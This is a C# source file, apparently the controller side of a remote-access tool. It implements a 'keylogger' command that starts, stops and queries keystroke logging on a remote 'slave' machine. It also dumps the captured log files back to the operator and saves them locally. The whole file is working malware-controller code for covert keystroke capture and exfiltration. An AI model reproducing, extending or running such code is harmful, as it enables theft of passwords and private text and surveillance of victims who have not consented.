using Master.AdvancedConsole;
using Master.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;
using Shared;

namespace Master.Commands
{
    internal class KeyLogger : IMasterCommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the slave's keystokes. You can see it's status, dump logged keys, start and stop it";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "start",
            "stop",
            "dump ?*:[localFileName]",
            "status"
        };

        public void Process(List<string> args)
        {
            if (args[0] == "dump")
            {
                GetLogFiles(args[1]);
            }
            else
            {
                Console.Write("Keylogger status : [");
                if (MasterCommandsManager.networkManager.ReadLine() == "on")
                    ColorTools.WriteInlineMessage("ON", ConsoleColor.Cyan);
                else
                    ColorTools.WriteInlineMessage("OFF", ConsoleColor.Red);
                Console.WriteLine("]");
            }
        }

        void GetLogFiles(string filename)
        {
            var first = true;

            while (true)
            {
                var data = GlobalCommandsManager.networkManager.ReadLine();
                if (data == "{end}")
                {
                    if(first) ColorTools.WriteCommandMessage("No logs");
                    return;
                }
                try
                {
                    var remoteFile = data;
                    data = GlobalCommandsManager.networkManager.ReadLine();
                    if (data.Length >= 2 && data.Substring(0, 2) == "KO")
                    {
                        ColorTools.WriteCommandError($"Couldn't get file '{remoteFile}'");
                    }
                    else
                    {
                        File.AppendAllText(filename, $"[{remoteFile}]\r\n{data}\r\n");
                        ColorTools.WriteCommandSuccess($"Got log file '{remoteFile}'");
                    }
                }
                catch (IOException)
                {
                    ColorTools.WriteCommandError($"Critical error: couldn't write log file '{filename}'. Aborting operation...");
                    return;
                }

                first = false;
            }
        }
    }
}
